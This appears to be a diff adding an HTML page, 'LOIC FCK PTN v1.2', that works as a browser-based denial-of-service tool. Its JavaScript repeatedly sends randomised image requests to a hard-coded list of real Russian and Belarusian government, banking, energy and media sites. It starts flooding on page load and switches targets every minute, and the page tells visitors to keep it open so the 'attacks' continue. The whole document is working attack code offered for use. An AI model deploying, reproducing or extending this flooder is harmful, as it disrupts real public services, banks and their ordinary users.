@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>LOIC FCK PTN v1.2</title>
+  <meta charset="utf-8"/>
+  <script>
+    "use strict";
+    const servers = [
+      "https://sputnik.by",
+      "https://www.gazprom.ru",
+      "https://lukoil.ru",
+      "https://magnit.ru/",
+      "https://www.nornickel.com/",
+      "https://www.surgutneftegas.ru/",
+      "https://www.tatneft.ru/",
+      "https://www.evraz.com/ru/",
+      "https://nlmk.com/",
+      "https://www.sibur.ru/",
+      "https://www.severstal.com/",
+      "https://www.metalloinvest.com/",
+      "https://nangs.org/",
+      "https://rmk-group.ru/ru/",
+      "https://www.tmk-group.ru/",
+      "https://ya.ru/",
+      "https://www.polymetalinternational.com/ru/",
+      "https://www.uralkali.com/ru/",
+      "https://www.eurosib.ru/",
+      "https://omk.ru/",
+      "https://www.sberbank.ru",
+      "https://www.vtb.ru/",
+      "https://www.gazprombank.ru/",
+      "https://www.gosuslugi.ru/",
+      "https://www.mos.ru/uslugi/",
+      "http://kremlin.ru/",
+      "http://government.ru/",
+      "https://mil.ru/",
+      "https://www.nalog.gov.ru/",
+      "https://customs.gov.ru/",
+      "https://pfr.gov.ru/",
+      "https://rkn.gov.ru/",
+      "https://www.gazprom.ru/",
+      "https://lukoil.ru",
+      "https://magnit.ru/",
+      "https://www.nornickel.com/",
+      "https://www.surgutneftegas.ru/",
+      "https://www.tatneft.ru/",
+      "https://www.evraz.com/ru/",
+      "https://nlmk.com/",
+      "https://www.sibur.ru/",
+      "https://www.severstal.com/",
+      "https://www.metalloinvest.com/",
+      "https://nangs.org/",
+      "https://rmk-group.ru/ru/",
+      "https://www.tmk-group.ru/",
+      "https://ya.ru/",
+      "https://www.polymetalinternational.com/ru/",
+      "https://www.uralkali.com/ru/",
+      "https://www.eurosib.ru/",
+      "https://omk.ru/",
+      "https://www.gosuslugi.ru/",
+      "https://www.mos.ru/uslugi/",
+      "http://kremlin.ru/",
+      "http://government.ru/",
+      "https://mil.ru/",
+      "https://www.nalog.gov.ru/",
+      "https://customs.gov.ru/",
+      "https://pfr.gov.ru/",
+      "https://rkn.gov.ru/",
+      "https://mail.rkn.gov.ru/",
+      "https://cloud.rkn.gov.ru",
+      "https://mvd.gov.ru",
+      "https://pwd.wto.economy.gov.ru/",
+      "https://stroi.gov.ru/",
+      "https://proverki.gov.ru/",
+      "https://belarusbank.by/",
+      "http://www.belta.by/",
+      "https://www.priorbank.by/",
+      "http://www.sb.by/",
+      "https://belarusbank.by/",
+      "https://www.sber-bank.by/sberprime",
+      "https://belapb.by/",
+      "http://sputnik.by/",
+      "http://www.belarus.by/",
+      "http://president.gov.by/",
+      "https://www.priorbank.by/",
+      "https://www.belnovosti.by/",
+      "https://www.gazeta.ru/",
+      "http://kp.ru/",
+      "https://www.mk.ru/",
+      "http://rbc.ru/",
+      "http://ria.ru/",
+      "https://sputnik.by/",
+      "https://yandex.by/",
+      "https://www.yaplakal.com/",
+      "https://belinvestbank.by/individual",
+    ];
+
+    function pickOne(index) {
+      var ctr = Math.floor(Math.random() * servers.length);
+      LOIC(servers[ctr], 10, index)
+    }
+
+    function generateId() {
+      return Math.random().toString(36).slice(-5);
+    }
+
+    function increment(field, index) {
+      const ctr = Number(document.getElementsByClassName(field)[index].innerHTML) + 1;
+      document.getElementsByClassName(field)[index].innerHTML = ctr;
+    }
+
+    function LOIC(target, requestsPerSecond, index) {
+      var isFiring = false;
+      var fireInterval = null;
+      var onFail = function () {
+        increment("failed", index);
+      };
+      var onSuccess = function () {
+        increment("succeeded", index);
+      };
+      var onRequest = function () {
+        increment("requests", index);
+      };
+      var DoS = function () {
+        var image = new Image();
+        image.onerror = function () {
+          onFail();
+        };
+        image.onabort = function () {
+          onFail();
+        };
+        image.onload = function () {
+          onSuccess();
+        }
+        image.src = target + "?" + generateId() + "=" + Math.floor(Math.random() * 1000);
+        onRequest();
+      };
+      document.getElementsByClassName("target")[index].value = target;
+      if (fireInterval) {
+        clearInterval(fireInterval);
+      }
+      document.getElementsByClassName("button")[index].onclick = null;
+      document.getElementsByClassName("button")[index].onclick = function () {
+        if (isFiring) {
+          clearInterval(fireInterval);
+          isFiring = false;
+          document.getElementsByClassName("button")[index].innerHTML = "Flood";
+          document.getElementsByClassName("status")[index].innerHTML = "Not Running";
+        } else {
+          isFiring = true;
+          document.getElementsByClassName("button")[index].innerHTML = "Stop Flood";
+          document.getElementsByClassName("status")[index].innerHTML = "Running";
+          fireInterval = setInterval(DoS, (1000 / parseInt(requestsPerSecond) | 0));
+        }
+      }
+    }
+  </script>
+  <style>
+      body {
+          background-color: black;
+          color: lime;
+          font-family: Impact, fantasy;
+          width: 100%;
+      }
+
+      input, button {
+          width: 300px;
+          margin-top: 1rem;
+          margin-bottom: 1rem;
+      }
+
+      button {
+          padding: 2rem;
+      }
+
+      .sleeper {
+          width: 24%;
+          display: inline-block;
+          padding: 2rem 0rem;
+      }
+
+      .blue, .blue * {
+          color: white;
+          background-color: #0057B8;
+      }
+
+      .yellow, .yellow * {
+          color: #333;
+          background-color: #FFD700;
+      }
+  </style>
+</head>
+<body>
+<h1 align="center">
+  LOIC FCK PTN v1.2
+</h1>
+<h2>Keep this page open to keep the "attacks" running, reload once per day to get updated lists of servers to target!</h2>
+<div class="sleeper blue">
+  <center>
+    <input class="target" name="target" readonly type="url"/>
+    <button class="button" name="button">Flood</button>
+    <br/>
+    Requests: <span class="requests">0</span>
+    <br/>
+    Succeeded: <span class="succeeded">0</span>
+    <br/>
+    Failed: <span class="failed">0</span>
+    <br/>
+    Status: <span class="status">Not Running</span>
+  </center>
+</div>
+<div class="sleeper yellow">
+  <center>
+    <input class="target" name="target" readonly type="url"/>
+    <button class="button" name="button">Flood</button>
+    <br/>
+    Requests: <span class="requests">0</span>
+    <br/>
+    Succeeded: <span class="succeeded">0</span>
+    <br/>
+    Failed: <span class="failed">0</span>
+    <br/>
+    Status: <span class="status">Not Running</span>
+  </center>
+</div>
+<div class="sleeper blue">
+  <center>
+    <input class="target" name="target" readonly type="url"/>
+    <button class="button" name="button">Flood</button>
+    <br/>
+    Requests: <span class="requests">0</span>
+    <br/>
+    Succeeded: <span class="succeeded">0</span>
+    <br/>
+    Failed: <span class="failed">0</span>
+    <br/>
+    Status: <span class="status">Not Running</span>
+  </center>
+</div>
+<div class="sleeper yellow">
+  <center>
+    <input class="target" name="target" readonly type="url"/>
+    <button class="button" name="button">Flood</button>
+    <br/>
+    Requests: <span class="requests">0</span>
+    <br/>
+    Succeeded: <span class="succeeded">0</span>
+    <br/>
+    Failed: <span class="failed">0</span>
+    <br/>
+    Status: <span class="status">Not Running</span>
+  </center>
+</div>
+<script>
+  var btns = document.getElementsByClassName("button");
+
+  function clickBtns() {
+    for (var i = 0; i < btns.length; i++) {
+      btns[i].click();
+    }
+  }
+
+  function triggerHell() {
+    if (document.getElementsByClassName("button")[0].textContent == 'Stop Flood') {
+      clickBtns();
+    }
+    pickOne(0);
+    pickOne(1);
+    pickOne(2);
+    pickOne(3);
+    setTimeout(clickBtns, 1000);
+  }
+
+  setInterval(triggerHell, 60000);
+  triggerHell();
+</script>
+<p align="center">&copy; JS LOIC - Thanx for the base script</p>
+</body>
+</html>
